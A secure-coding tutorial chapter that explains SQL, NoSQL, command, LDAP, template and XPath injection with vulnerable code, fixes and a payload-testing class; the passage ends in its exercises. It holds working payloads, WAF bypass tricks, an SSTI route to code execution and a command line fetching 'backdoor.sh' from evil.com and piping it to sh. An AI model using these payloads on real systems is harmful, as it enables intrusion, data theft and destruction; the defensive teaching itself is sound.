# Injection

> Explains attack techniques for SQL, NoSQL, command, and LDAP injection, along with systematic defenses using parameterized queries, ORMs, and input validation.

## Prerequisites

- Basic SQL syntax (SELECT / INSERT / UPDATE / DELETE)
- Fundamentals of HTTP requests and responses ([../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md))
- Basic Python syntax (for understanding code examples)

## What You Will Learn

1. Understand the principles and dangers of **various injection attacks** (SQL/NoSQL/command/LDAP/template)
2. Master **parameterized queries and ORMs** as fundamental defense techniques
3. Learn a **multi-layered defense approach** using input validation and output encoding
4. Recognize advanced attack patterns such as **second-order injection**
5. Understand **WAF bypass techniques** and the importance of root-cause countermeasures

---

## 1. Principles of Injection Attacks

Injection is a vulnerability in which user input is interpreted as part of code, queries, or commands, allowing attackers to execute unintended operations. It is ranked third in the OWASP Top 10 2021 (A03:2021-Injection).

### 1.1 Root Cause of Injection

```
Root cause of injection: mixing data and code

  Normal processing:
  +-------------------------------------------------+
  | SQL statement (code): SELECT * FROM users WHERE name = |
  | User input (data): 'alice'                    |
  | → Input is treated as a "value"               |
  +-------------------------------------------------+

  Injection:
  +-------------------------------------------------+
  | SQL statement (code): SELECT * FROM users WHERE name = |
  | User input (code+data): '' OR '1'='1'         |
  | → Input changes the "structure" of the SQL    |
  +-------------------------------------------------+

  Fundamental solution: separate data from code
  → Parameterized queries / prepared statements
```

```
Basic principle of injection:

  Normal request:
  User input: "alice"
  Generated SQL: SELECT * FROM users WHERE name = 'alice'
                                        ^^^^^^^^
                                        Treated as data

  Attack request:
  User input: "' OR '1'='1"
  Generated SQL: SELECT * FROM users WHERE name = '' OR '1'='1'
                                        ^^^^^^^^^^^^^^^^^^^^^
                                        Interpreted as code!
```

### 1.2 Impact Scope of Injection

```
What injection attacks can do:

  +-------------------+------------------------------------------+
  | Attack type       | Impact                                   |
  +-------------------+------------------------------------------+
  | Data theft        | Read all table data                      |
  | Auth bypass       | Unauthorized login as admin account      |
  | Data tampering    | Insert, update, or delete records        |
  | Privilege escalation | Obtain DB administrator privileges   |
  | OS command execution | OS operations via xp_cmdshell (SQL Server), etc. |
  | File read/write   | LOAD_FILE() / INTO OUTFILE (MySQL)       |
  | DoS               | Overload DB with heavy queries           |
  | Pivot to secondary attacks | Lateral movement to other systems |
  +-------------------+------------------------------------------+
```

---

## 2. SQL Injection

### 2.1 Basic Attack Patterns

```python
# Code example 1: SQL injection attack patterns and defenses

import sqlite3

# === Vulnerable code ===
def login_vulnerable(username, password):
    """SQL built by string concatenation -> SQL injection vulnerability"""
    conn = sqlite3.connect("app.db")
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    # Attack example: username = "admin' --"
    # Generated SQL: SELECT * FROM users WHERE username='admin' --' AND password=''
    # Everything after -- is a comment -> password check is skipped
    result = conn.execute(query).fetchone()
    return result is not None

# === Safe code: parameterized query ===
def login_safe(username, password):
    """Execute SQL safely using parameterized queries"""
    conn = sqlite3.connect("app.db")
    query = "SELECT * FROM users WHERE username=? AND password=?"
    # ? is a placeholder -> input is always treated as data
    result = conn.execute(query, (username, password)).fetchone()
    return result is not None

# === Even safer: using ORM ===
from sqlalchemy.orm import Session
from sqlalchemy import select

def login_orm(session: Session, username: str, password_hash: str):
    """Safe query using ORM"""
    stmt = select(User).where(
        User.username == username,
        User.password_hash == password_hash,
    )
    return session.execute(stmt).scalar_one_or_none()
```

### 2.2 Advanced SQL Injection

```
Types of SQL injection:

+----------------+-----------------------------+------------------+
| Type           | Characteristics             | Detection difficulty |
+----------------+-----------------------------+------------------+
| Classic        | Extracts info from error messages | Low          |
| Union-based    | Retrieves data from other tables via UNION | Medium |
| Blind (Boolean)| Infers info from true/false response differences | High |
| Blind (Time)   | Infers info from response time differences | High |
| Second-order   | Triggered later after storage | Very high      |
| Out-of-Band    | Exfiltrates data via external channel | Very high  |
+----------------+-----------------------------+------------------+
```

### 2.3 Union-based SQL Injection in Detail

```
Steps of Union-based SQL injection:

  Step 1: Identify the number of columns
  Input: ' ORDER BY 1-- (success)
  Input: ' ORDER BY 2-- (success)
  Input: ' ORDER BY 3-- (error → number of columns is 2)

  Step 2: Identify displayable columns
  Input: ' UNION SELECT 1,2--
  → Check where "1" or "2" appears on the page

  Step 3: Retrieve database information
  Input: ' UNION SELECT version(),database()--
  → MySQL 8.0.28, myapp_db

  Step 4: List all tables
  Input: ' UNION SELECT table_name,NULL
         FROM information_schema.tables
         WHERE table_schema=database()--

  Step 5: Retrieve column information
  Input: ' UNION SELECT column_name,data_type
         FROM information_schema.columns
         WHERE table_name='users'--

  Step 6: Extract data
  Input: ' UNION SELECT username,password FROM users--
```

```python
# Code example 2: How Blind SQL injection works and countermeasures
import time

# Blind (Boolean-based) attack example
# Attacker's script (for explanation purposes only)
def demonstrate_blind_sqli_concept():
    """
    Conceptual code showing the principle of Blind SQLi.
    In actual penetration testing, tools like sqlmap are used.

    Vulnerable endpoint: /user?id=1
    Normal: /user?id=1 → 200 OK (user info displayed)
    Attack: /user?id=1 AND 1=1 → 200 OK (true)
    Attack: /user?id=1 AND 1=2 → 404 Not Found (false)
    → Extracts information one bit at a time from response differences

    Example: Identifying the first character of the database name
    /user?id=1 AND SUBSTRING(database(),1,1)='a' → 404 (false)
    /user?id=1 AND SUBSTRING(database(),1,1)='b' → 404 (false)
    ...
    /user?id=1 AND SUBSTRING(database(),1,1)='m' → 200 (true!)
    → First character of the database name is 'm'
    """
    pass

# Principle of Time-based Blind SQLi
def demonstrate_time_based_concept():
    """
    Determines true/false not by response presence but by response time.

    /user?id=1; IF(SUBSTRING(database(),1,1)='m',
                    SLEEP(5), 0)
    → 5-second delay = true (first character is 'm')
    → Immediate response = false

    Countermeasure: Using parameterized queries prevents all such attacks.
    """
    pass
```

### 2.4 Second-order SQL Injection

```python
# Code example 3: Example of second-order SQL injection and countermeasures

# Second-order: triggered not at input time, but when stored data is used

# Vulnerable code
def register_user(username, password):
    """User registration (looks safe because it's parameterized)"""
    db.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        (username, password)  # Safe here
    )

def change_password(username, new_password):
    """Password change (vulnerable here!)"""
    # Fetch username from DB and embed it in SQL
    user = db.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
    # user["username"] = "admin'--" (value planted during registration)
    db.execute(
        f"UPDATE users SET password='{new_password}' WHERE username='{user['username']}'"
    )
    # Result: UPDATE users SET password='...' WHERE username='admin'--'
    # admin's password is changed!

# Safe code: always use parameterization for all SQL statements
def change_password_safe(username, new_password):
    db.execute(
        "UPDATE users SET password=? WHERE username=?",
        (new_password, username)  # Always parameterized
    )
```

```
Flow of second-order SQL injection:

  Attacker               Application                Database
    |                          |                          |
    |-- Register: username = ->|                          |
    |   "admin'--"             |-- INSERT (parameterized) ->|
    |                          |   Stored safely           |
    |                          |                          |
    |   (later)                |                          |
    |-- Request password change ->|                       |
    |                          |-- SELECT (parameterized) ->|
    |                          |<-- Retrieves "admin'--" --|
    |                          |                          |
    |                          |-- UPDATE (string concat!) ->|
    |                          |   WHERE username='admin'--|
    |                          |   → admin's password      |
    |                          |     gets changed!         |

  Lesson: Do not trust values retrieved from the database either.
          Always use parameterization for all SQL statements.
```

### 2.5 Parameterized Query Syntax per DB

```python
# Code example 4: Parameterized queries in various databases/languages

# --- Python ---

# SQLite3
import sqlite3
conn = sqlite3.connect("app.db")
conn.execute("SELECT * FROM users WHERE id=?", (user_id,))

# MySQL (mysql-connector-python)
import mysql.connector
conn = mysql.connector.connect(host="localhost", database="myapp")
cursor = conn.cursor(prepared=True)
cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))

# PostgreSQL (psycopg2)
import psycopg2
conn = psycopg2.connect("dbname=myapp")
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))

# SQLAlchemy ORM
from sqlalchemy import select, text
# ORM query (automatically parameterized)
stmt = select(User).where(User.id == user_id)
# When using text() (specify bind parameters)
stmt = text("SELECT * FROM users WHERE id = :id").bindparams(id=user_id)

# --- Java ---
# PreparedStatement ps = conn.prepareStatement(
#     "SELECT * FROM users WHERE id = ?");
# ps.setInt(1, userId);
# ResultSet rs = ps.executeQuery();

# --- Node.js (pg) ---
# const result = await pool.query(
#     'SELECT * FROM users WHERE id = $1',
#     [userId]
# );

# --- Go ---
# rows, err := db.Query(
#     "SELECT * FROM users WHERE id = $1",
#     userId,
# )
```

### 2.6 WAF Bypass Techniques for SQL Injection

```
WAF bypass techniques (why WAF alone is insufficient):

  1. Mixed case:
     SeLeCt → same meaning as SELECT

  2. Comment insertion:
     SEL/**/ECT → SELECT
     UN/**/ION → UNION

  3. Encoding:
     %53%45%4C%45%43%54 → SELECT (URL encoding)
     CHAR(83,69,76,69,67,84) → SELECT (ASCII)

  4. Equivalent functions/syntax:
     SUBSTRING() → SUBSTR() → MID()
     CONCAT() → || (Oracle/SQLite)
     IF() → CASE WHEN ... THEN ... ELSE ... END

  5. Whitespace alternatives:
     SELECT\t*\tFROM → separated by TAB
     SELECT%0a*%0aFROM → separated by newline
     SELECT/**/*/**/ FROM → separated by comments

  6. Double encoding:
     %2527 → %27 → ' (when server double-decodes)

  7. HTTP parameter pollution:
     ?id=1&id=UNION+SELECT → when server uses the latter

  Conclusion: WAF can be bypassed. The only root-cause fix is parameterized queries.
```

---

## 3. NoSQL Injection

### 3.1 Attacks Against MongoDB

```python
# Code example 5: NoSQL injection (MongoDB) attacks and defenses
from pymongo import MongoClient

client = MongoClient("mongodb://localhost:27017")
db = client["myapp"]

# === Vulnerable code ===
def find_user_vulnerable(request_data):
    """Using JSON data directly in queries -> NoSQL injection"""
    username = request_data["username"]
    password = request_data["password"]
    # Attack: {"username": "admin", "password": {"$ne": ""}}
    # $ne (not equal) matches anything non-empty -> auth succeeds with any password
    user = db.users.find_one({"username": username, "password": password})
    return user

# === Safe code ===
def find_user_safe(request_data):
    """Validate input before using in queries"""
    username = request_data.get("username", "")
    password = request_data.get("password", "")

    # Type check: only strings allowed (reject objects)
    if not isinstance(username, str) or not isinstance(password, str):
        raise ValueError("Invalid input type")

    # Length limit
    if len(username) > 100 or len(password) > 200:
        raise ValueError("Input too long")

    # Remove MongoDB operators
    if any(key.startswith("$") for key in [username, password]
           if isinstance(key, str) and key.startswith("$")):
        raise ValueError("Invalid characters in input")

    user = db.users.find_one({
        "username": str(username),  # Explicitly convert to string
        "password_hash": hash_password(str(password)),
    })
    return user
```

### 3.2 NoSQL Injection Attack Patterns

```
MongoDB NoSQL injection attack patterns:

  1. Operator injection:
     {"username": "admin", "password": {"$ne": ""}}
     → password is not empty → auth succeeds with any password

     {"username": "admin", "password": {"$gt": ""}}
     → password is greater than empty string → same auth bypass

     {"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
     → partial username match via regex

  2. $where injection:
     {"$where": "this.username == 'admin' && this.password == '" + input + "'"}
     → input = "' || '1'=='1" matches all records

  3. Array manipulation:
     {"username": "admin", "password": ["password1", "password2"]}
     → Auth succeeds if any array element matches (depending on MongoDB behavior)

  4. JavaScript injection ($where / mapReduce):
     {"$where": "function() { return this.username == '" + input + "' }"}
     → JS code can be injected through input

  Countermeasures:
  - Strictly check input types (allow only strings)
  - Reject keys beginning with $
  - Whitelist-restrict MongoDB operators
  - Avoid using $where / mapReduce
```

```python
# Code example 6: Comprehensive injection defense for MongoDB
import re
from typing import Any

class MongoSanitizer:
    """Input sanitization for MongoDB queries"""

    MONGO_OPERATORS = {
        "$gt", "$gte", "$lt", "$lte", "$ne", "$in", "$nin",
        "$and", "$or", "$not", "$nor", "$exists", "$type",
        "$regex", "$where", "$text", "$search", "$mod",
        "$all", "$elemMatch", "$size", "$slice",
    }

    @staticmethod
    def sanitize_value(value: Any) -> Any:
        """Sanitize query values"""
        if isinstance(value, str):
            # Strings are safe as-is
            return value
        elif isinstance(value, (int, float, bool)):
            # Primitive types are safe
            return value
        elif isinstance(value, dict):
            # Dict type (may contain MongoDB operators)
            for key in value:
                if key.startswith("$"):
                    raise ValueError(
                        f"MongoDB operator not allowed: {key}"
                    )
            return value
        elif isinstance(value, list):
            # List type: sanitize each element
            return [MongoSanitizer.sanitize_value(v) for v in value]
        else:
            raise ValueError(f"Unsupported type: {type(value)}")

    @staticmethod
    def sanitize_query(query: dict) -> dict:
        """Sanitize entire query"""
        sanitized = {}
        for key, value in query.items():
            if key.startswith("$"):
                raise ValueError(f"Top-level operator not allowed: {key}")
            sanitized[key] = MongoSanitizer.sanitize_value(value)
        return sanitized

# Usage example
sanitizer = MongoSanitizer()
try:
    # Normal query
    safe_query = sanitizer.sanitize_query({
        "username": "alice",
        "age": 25,
    })
    result = db.users.find_one(safe_query)

    # Malicious query → exception raised
    malicious = sanitizer.sanitize_query({
        "username": "admin",
        "password": {"$ne": ""},  # ValueError!
    })
except ValueError as e:
    print(f"Blocked malicious query: {e}")
```

---

## 4. Command Injection

### 4.1 How Attacks Work and Defenses

```python
# Code example 7: Command injection attacks and defenses
import subprocess
import shlex
import re

# === Vulnerable code ===
def ping_host_vulnerable(host):
    """Command execution with os.system or shell=True -> command injection"""
    import os
    os.system(f"ping -c 3 {host}")
    # Attack: host = "google.com; cat /etc/passwd"
    # Executed: ping -c 3 google.com; cat /etc/passwd

# === Safe code ===
def ping_host_safe(host: str) -> str:
    """Safe command execution"""
    # Step 1: Input validation (whitelist approach)
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError(f"Invalid hostname: {host}")

    # Step 2: Pass arguments as a list with shell=False
    result = subprocess.run(
        ["ping", "-c", "3", host],  # List form -> not interpreted by shell
        capture_output=True,
        text=True,
        timeout=10,
        shell=False,  # Explicitly False (default, but made explicit)
    )
    return result.stdout

# === Even safer: avoid external commands ===
import socket

def check_host_reachable(host: str) -> bool:
    """Check host reachability without external commands"""
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError(f"Invalid hostname: {host}")
    try:
        socket.create_connection((host, 80), timeout=5)
        return True
    except (socket.timeout, socket.error):
        return False
```

### 4.2 Command Injection Attack Patterns

```
Command injection syntax:

  Attacks using shell metacharacters:
  +------------------+---------------------------------------+
  | Metacharacter    | Effect                                |
  +------------------+---------------------------------------+
  | ;                | Command chaining (regardless of exit status) |
  | &&               | Execute if previous command succeeded |
  | ||               | Execute if previous command failed    |
  | |                | Pipe (feed output of previous command as input) |
  | $(command)       | Command substitution                  |
  | `command`        | Command substitution (backtick)       |
  | > file           | Redirect output to file               |
  | < file           | Read input from file                  |
  | \n               | Newline (interpreted as new command)  |
  +------------------+---------------------------------------+

  Attack examples:
  Input: "google.com; rm -rf /"
  Input: "google.com && wget http://evil.com/backdoor.sh | sh"
  Input: "google.com$(cat /etc/passwd)"
  Input: "google.com`whoami`"
```

```python
# Code example 8: Safe subprocess execution wrapper
import subprocess
import re
from typing import Optional

class SafeCommandRunner:
    """Safe command execution wrapper

    Principles:
    1. Always use shell=False
    2. Pass arguments as a list
    3. Validate input with a whitelist
    4. Set a timeout
    5. Restrict executable commands
    """

    ALLOWED_COMMANDS = {
        "ping": {
            "path": "/usr/bin/ping",
            "allowed_args": ["-c", "-W"],
            "input_pattern": r'^[a-zA-Z0-9.\-]+$',
        },
        "dig": {
            "path": "/usr/bin/dig",
            "allowed_args": ["+short", "+timeout"],
            "input_pattern": r'^[a-zA-Z0-9.\-]+$',
        },
        "nslookup": {
            "path": "/usr/bin/nslookup",
            "allowed_args": [],
            "input_pattern": r'^[a-zA-Z0-9.\-]+$',
        },
    }

    def run(self, command: str, args: list, user_input: str,
            timeout: int = 10) -> Optional[str]:
        """Execute a command safely"""
        # Whitelist check for command
        if command not in self.ALLOWED_COMMANDS:
            raise ValueError(f"Command not allowed: {command}")

        cmd_config = self.ALLOWED_COMMANDS[command]

        # Whitelist check for arguments
        for arg in args:
            if arg not in cmd_config["allowed_args"]:
                raise ValueError(f"Argument not allowed: {arg}")

        # Validate user input
        if not re.match(cmd_config["input_pattern"], user_input):
            raise ValueError(f"Invalid input: {user_input}")

        # Execute command (use full path)
        cmd = [cmd_config["path"]] + args + [user_input]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                shell=False,
                env={},  # Empty environment variables (prevent PATH injection)
            )
            return result.stdout
        except subprocess.TimeoutExpired:
            return None

# Usage example
runner = SafeCommandRunner()
output = runner.run("ping", ["-c", "3"], "example.com")
```

---

## 5. LDAP Injection

### 5.1 How Attacks Work

```python
# Code example 9: LDAP injection attacks and defenses

# === Vulnerable code ===
def search_user_vulnerable(username):
    """Build LDAP filter by string concatenation"""
    ldap_filter = f"(&(uid={username})(objectClass=person))"
    # Attack: username = "*)(uid=*))(|(uid=*"
    # Generated: (&(uid=*)(uid=*))(|(uid=*)(objectClass=person))
    # -> All users are returned
    return ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, ldap_filter)

# === Safe code ===
def ldap_escape(value: str) -> str:
    """Escape LDAP special characters (RFC 4515 compliant)"""
    escape_chars = {
        '\\': r'\5c',
        '*': r'\2a',
        '(': r'\28',
        ')': r'\29',
        '\x00': r'\00',
    }
    result = value
    # Escape backslash first (order matters)
    for char, replacement in escape_chars.items():
        result = result.replace(char, replacement)
    return result

def search_user_safe(username: str):
    """Build LDAP filter with escaped input"""
    # Input validation
    if not username or len(username) > 100:
        raise ValueError("Invalid username")

    safe_username = ldap_escape(username)
    ldap_filter = f"(&(uid={safe_username})(objectClass=person))"
    return ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, ldap_filter)
```

### 5.2 LDAP DN (Distinguished Name) Injection

```
LDAP DN injection:

  DN is also vulnerable to injection, separate from LDAP filters.

  Normal: cn=alice,ou=users,dc=example,dc=com
  Attack: cn=alice,ou=admin,ou=users,dc=example,dc=com
  → Attempts to access the admin OU

  DN escape characters (RFC 4514):
  +--------+------------------+
  | Char   | Escaped          |
  +--------+------------------+
  | ,      | \,               |
  | +      | \+               |
  | "      | \"               |
  | \      | \\               |
  | <      | \<               |
  | >      | \>               |
  | ;      | \;               |
  | leading # | \#            |
  | leading/trailing space | \20 |
  +--------+------------------+
```

---

## 6. Template Injection (SSTI)

```python
# Code example 10: Server-Side Template Injection (SSTI)
from flask import Flask, request, render_template_string

app = Flask(__name__)

# === Vulnerable code ===
@app.route("/greet")
def greet_vulnerable():
    name = request.args.get("name", "")
    # User input interpreted as a template → SSTI!
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)
    # Attack: name = {{7*7}} → "Hello, 49!"
    # Attack: name = {{config.SECRET_KEY}} → secret key is leaked
    # Attack: name = {{''.__class__.__mro__[1].__subclasses__()}}
    #   → Traverses Python class hierarchy for RCE (remote code execution)

# === Safe code ===
@app.route("/greet")
def greet_safe():
    name = request.args.get("name", "")
    # Fix the template and pass name as a variable
    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
    # {{ name }} is treated as data, not interpreted as template syntax

# === Even safer: Jinja2 sandbox ===
from jinja2.sandbox import SandboxedEnvironment

sandbox = SandboxedEnvironment()

@app.route("/greet-sandbox")
def greet_sandbox():
    name = request.args.get("name", "")
    template = sandbox.from_string("<h1>Hello, {{ name }}!</h1>")
    return template.render(name=name)
```

```
SSTI attack chain (for Jinja2):

  Step 1: Identify the template engine
  {{7*7}} → 49 (Jinja2/Twig)
  ${7*7} → 49 (Freemarker/Velocity)
  #{7*7} → 49 (Ruby ERB)

  Step 2: Information gathering
  {{config}} → Flask configuration leaked
  {{self}} → Template object

  Step 3: RCE (remote code execution)
  Jinja2:
  {{''.__class__.__mro__[1].__subclasses__()[X]}}
  → X = index of subprocess.Popen
  → Execute os.popen('id').read()

  Countermeasures:
  1. Do not embed user input into template strings
  2. Fix the template and pass input as a variable
  3. Use SandboxedEnvironment
  4. Disable automatic template reloading
```

---

## 7. XPath Injection

```python
# Code example 11: XPath injection attacks and defenses
from lxml import etree

# XML data
xml_data = """
<users>
    <user>
        <username>admin</username>
        <password>secret123</password>
        <role>admin</role>
    </user>
    <user>
        <username>alice</username>
        <password>pass456</password>
        <role>user</role>
    </user>
</users>
"""

tree = etree.fromstring(xml_data.encode())

# === Vulnerable code ===
def auth_vulnerable(username, password):
    """Build XPath by string concatenation"""
    xpath = f"//user[username='{username}' and password='{password}']"
    # Attack: username = "' or '1'='1' or '"
    # XPath: //user[username='' or '1'='1' or '' and password='']
    # → Matches all users
    result = tree.xpath(xpath)
    return len(result) > 0

# === Safe code ===
def auth_safe(username, password):
    """Safe query using XPath variables"""
    # XPath variable binding in lxml
    xpath = "//user[username=$username and password=$password]"
    result = tree.xpath(
        xpath,
        username=username,
        password=password,
    )
    return len(result) > 0
```

---

## 8. Systematic Injection Defense

```
Multi-layered injection defense:

  Layer 1: Input validation
  +----------------------------------------------+
  | Whitelist, type checking, length limits        |
  | Regex pattern matching, character restrictions |
  +----------------------------------------------+
                      |
  Layer 2: Parameterization / ORM
  +----------------------------------------------+
  | Separation of data and code, prepared statements |
  | ORM query builders                            |
  +----------------------------------------------+
                      |
  Layer 3: Output encoding
  +----------------------------------------------+
  | Context-specific escaping (HTML/SQL/Shell/LDAP) |
  | Automatic escaping by template engines        |
  +----------------------------------------------+
                      |
  Layer 4: Least privilege
  +----------------------------------------------+
  | Restrict DB permissions, sandbox, WAF         |
  | OS-level access control                       |
  +----------------------------------------------+
                      |
  Layer 5: Detection and monitoring
  +----------------------------------------------+
  | WAF logs, SQL error log monitoring, anomaly detection |
  | Penetration testing                           |
  +----------------------------------------------+
```

### Comparison of Countermeasures by Injection Type

| Injection type | Root countermeasure | Supplementary countermeasure | Testing tools |
|----------------|--------------------|-----------------------------|---------------|
| SQL | Parameterized queries | WAF, least-privilege DB | SQLMap |
| NoSQL | Type checking, operator filtering | Schema validation | NoSQLMap |
| Command | shell=False, argument list | Input whitelist | Commix |
| LDAP | Special character escaping | Input validation | LDAP Injection Tester |
| XPath | Parameterized XPath | Input restrictions | - |
| Template | Sandbox + variable separation | Template engine settings | tplmap |
| Header | Header value sanitization | Remove newline characters | Burp Suite |

### Minimizing Database Permissions

```sql
-- Code example 12: Minimizing DB permissions (MySQL)

-- Create application user (least privilege)
CREATE USER 'app_user'@'%' IDENTIFIED BY 'strong_password';

-- Grant only SELECT/INSERT/UPDATE on necessary tables
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'%';
GRANT SELECT, INSERT ON myapp.orders TO 'app_user'@'%';

-- DELETE only allowed under specific conditions (via stored procedure)
-- Do not grant direct DELETE permission

-- Do not grant dangerous permissions
-- GRANT FILE ON *.* → enables file read/write
-- GRANT PROCESS ON *.* → exposes process list
-- GRANT SUPER ON *.* → allows admin operations

-- Read-only user (for reporting)
CREATE USER 'report_user'@'%' IDENTIFIED BY 'another_password';
GRANT SELECT ON myapp.* TO 'report_user'@'%';

-- Verify permissions
SHOW GRANTS FOR 'app_user'@'%';
```

```python
# Code example 13: Database connection and error handling with SQLAlchemy
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker
from sqlalchemy.exc import SQLAlchemyError
import logging

logger = logging.getLogger(__name__)

# Create engine (connection pool settings)
engine = create_engine(
    "postgresql://app_user:password@localhost/myapp",
    pool_size=10,
    max_overflow=20,
    pool_recycle=3600,
    echo=False,  # Do not output SQL logs in production (prevent info leakage)
)

Session = sessionmaker(bind=engine)

class UserRepository:
    """Safe data access layer"""

    def find_by_username(self, username: str):
        """Safe query using ORM"""
        with Session() as session:
            try:
                return session.query(User).filter(
                    User.username == username
                ).first()
            except SQLAlchemyError as e:
                # Do not include SQL details in error messages
                logger.error(f"Database error: {type(e).__name__}")
                raise ApplicationError("Failed to retrieve data")

    def search_users(self, keyword: str, limit: int = 50):
        """Safe implementation of LIKE search"""
        with Session() as session:
            # Escape LIKE wildcard characters
            safe_keyword = keyword.replace('%', r'\%').replace('_', r'\_')
            return session.query(User).filter(
                User.username.ilike(f"%{safe_keyword}%", escape='\\')
            ).limit(min(limit, 100)).all()  # Set upper limit

    def execute_raw_query(self, query_template: str, params: dict):
        """Safe execution when raw SQL is necessary"""
        with Session() as session:
            # Always use text() + bind parameters
            stmt = text(query_template)
            return session.execute(stmt, params).fetchall()

# Usage example
repo = UserRepository()
user = repo.find_by_username("alice")  # Parameterized
results = repo.execute_raw_query(
    "SELECT * FROM users WHERE created_at > :date AND status = :status",
    {"date": "2024-01-01", "status": "active"}
)
```

---

## 9. Edge Cases

### Edge Case 1: Injection Inside Stored Procedures

```sql
-- Dynamic SQL inside stored procedures is also dangerous

-- NG: String concatenation inside a stored procedure
CREATE PROCEDURE search_users(IN search_term VARCHAR(100))
BEGIN
    SET @sql = CONCAT('SELECT * FROM users WHERE name LIKE "%',
                       search_term, '%"');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
END;

-- OK: Use parameter binding
CREATE PROCEDURE search_users_safe(IN search_term VARCHAR(100))
BEGIN
    SET @search = CONCAT('%', search_term, '%');
    PREPARE stmt FROM 'SELECT * FROM users WHERE name LIKE ?';
    EXECUTE stmt USING @search;
    DEALLOCATE PREPARE stmt;
END;
```

### Edge Case 2: Unsafe Patterns with ORM

```python
# Unsafe patterns even when using ORM

from sqlalchemy import text

# NG: String concatenation inside text()
def search_unsafe(keyword):
    query = text(f"SELECT * FROM users WHERE name LIKE '%{keyword}%'")
    return db.execute(query).fetchall()

# NG: String concatenation inside filter()
def search_unsafe2(column_name, value):
    # Dynamically specifying column name → injection possible
    query = text(f"SELECT * FROM users WHERE {column_name} = :value")
    return db.execute(query, {"value": value}).fetchall()

# OK: Validate column name with whitelist
ALLOWED_COLUMNS = {"username", "email", "status"}

def search_safe(column_name, value):
    if column_name not in ALLOWED_COLUMNS:
        raise ValueError(f"Invalid column: {column_name}")
    query = text(f"SELECT * FROM users WHERE {column_name} = :value")
    return db.execute(query, {"value": value}).fetchall()
```

### Edge Case 3: Bypass via Encoding

```
Escape bypass using multibyte characters:

  Issue in GBK/Shift_JIS environments:
  - Backslash (\) is 0x5c
  - The second byte of some GBK characters is 0x5c
  - Example: 0xbf5c is a valid GBK character

  Attack:
  Input: 0xbf27 (0xbf + single quote)
  After escaping: 0xbf5c27 (0xbf + backslash + single quote)
  GBK interpretation: [valid 2-byte char]' ← quote is not escaped!

  Countermeasures:
  - Use UTF-8 and unify character encoding
  - Set SET NAMES utf8mb4 at connection time
  - Use parameterized queries (avoids encoding issues)
  - Use DB-specific escape functions like mysql_real_escape_string
```

---

## 10. Testing Methods

```python
# Code example 14: Testing for injection vulnerabilities
import requests
from typing import List, Dict

class InjectionTester:
    """Basic testing for injection vulnerabilities"""

    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "1 UNION SELECT NULL,NULL,NULL",
        "1' AND SLEEP(5) --",
        "admin'--",
    ]

    NOSQL_PAYLOADS = [
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
    ]

    COMMAND_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
    ]

    def test_sql_injection(self, url: str, param: str) -> List[Dict]:
        """Basic SQL injection test"""
        results = []
        baseline = requests.get(url, params={param: "normal_value"})

        for payload in self.SQL_PAYLOADS:
            response = requests.get(url, params={param: payload})
            suspicious = False

            # Detect abnormal responses
            if response.status_code == 500:
                suspicious = True  # SQL error
            if "sql" in response.text.lower() or "syntax" in response.text.lower():
                suspicious = True  # Error message disclosure
            if len(response.text) != len(baseline.text):
                suspicious = True  # Response size change

            results.append({
                "payload": payload,
                "status": response.status_code,
                "suspicious": suspicious,
                "response_length": len(response.text),
            })

        return results

    def test_error_disclosure(self, url: str, param: str) -> Dict:
        """Check whether error messages contain DB information"""
        error_indicators = [
            "mysql", "postgresql", "sqlite", "oracle",
            "syntax error", "unclosed quotation",
            "unterminated string", "SQL",
        ]
        response = requests.get(url, params={param: "'"})
        found = [ind for ind in error_indicators
                 if ind.lower() in response.text.lower()]
        return {
            "error_disclosure": len(found) > 0,
            "indicators_found": found,
        }

# Usage example (only run in permitted environments)
# tester = InjectionTester()
# results = tester.test_sql_injection("http://localhost:8080/search", "q")
```

---

## 11. Performance Considerations

```
Performance effects of parameterized queries:

  String concatenation vs. parameterized queries:

  +----------------------------+------------------+------------------+
  | Item                       | String concat    | Parameterized    |
  +----------------------------+------------------+------------------+
  | Query plan                 | Generated each time | Cacheable     |
  | Parse processing           | Executed each time | First time only |
  | Security                   | Vulnerable       | Safe             |
  | Speed comparison (10,000 runs) | 1.0x (baseline) | 0.7x-0.9x (faster) |
  +----------------------------+------------------+------------------+

  ORM overhead:
  - Query generation: +0.1-0.5ms (negligible in most cases)
  - N+1 problem: address with eager loading
  - Complex queries: raw SQL + parameter binding

  Performance and security are not a trade-off.
  Parameterized queries improve both safety and performance.
```

---

## Exercises

### Exercise 1: Basic — Rewrite with Parameterized Queries

**Task**: Rewrite the following vulnerable code using parameterized queries.

```python
# Target for rewrite:
def search_products(category, min_price, max_price, sort_by):
    query = f"""
    SELECT * FROM products
    WHERE category = '{category}'
    AND price BETWEEN {min_price} AND {max_price}
    ORDER BY {sort_by}
    """
    return db.execute(query).fetchall()

# Hints:
# - Parameterize category, min_price, max_price
# - Validate sort_by with a whitelist (cannot be parameterized)
```

### Exercise 2: Applied — Comprehensive Input Validation

**Task**: Implement a validation class that satisfies the following requirements.

```
Requirements:
1. String validation (length, pattern, forbidden characters)
2. Numeric validation (range, integer/float)
3. Email address validation
4. SQL injection / NoSQL injection detection
5. Detailed validation error reports
6. Extensibility to add custom rules
```

### Exercise 3: Advanced — Secure CRUD API

**Task**: Implement an API using FastAPI + SQLAlchemy that satisfies the following.

```
Requirements:
1. CRUD operations for users (Create, Read, Update, Delete)
